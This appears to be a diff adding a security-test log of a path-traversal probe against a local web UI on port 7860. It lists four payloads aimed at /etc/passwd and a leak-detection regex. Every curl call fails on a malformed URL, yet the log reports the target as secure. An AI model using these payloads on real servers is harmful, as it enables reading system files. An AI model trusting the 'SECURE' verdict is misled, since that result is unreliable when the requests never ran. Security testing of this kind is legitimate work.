@@ -1,0 +1,30 @@
+# D5.2 - REAL path-traversal probe
+# timestamp_utc: 2026-05-31T22:24:44Z
+# framework: tgwui  kind: get_path  port: 7860
+# leak validation regex: root:.*:0:0:
+
+### payload: ../../../../etc/passwd
+curl: (3) unmatched close brace/bracket in URL position 50:
+http://127.0.0.1:7860/file=../../../../etc/passwd}
+                                                 ^
+
+
+### payload: ..%2f..%2f..%2f..%2fetc%2fpasswd
+curl: (3) unmatched close brace/bracket in URL position 60:
+http://127.0.0.1:7860/file=..%2f..%2f..%2f..%2fetc%2fpasswd}
+                                                           ^
+
+
+### payload: ....//....//....//etc/passwd
+curl: (3) unmatched close brace/bracket in URL position 56:
+http://127.0.0.1:7860/file=....//....//....//etc/passwd}
+                                                       ^
+
+
+### payload: /etc/passwd
+curl: (3) unmatched close brace/bracket in URL position 39:
+http://127.0.0.1:7860/file=/etc/passwd}
+                                      ^
+
+
+# RESULT: TRAVERSAL_ATTEMPTED_NO_LEAK (scorer -> SECURE: rejected/sanitized)
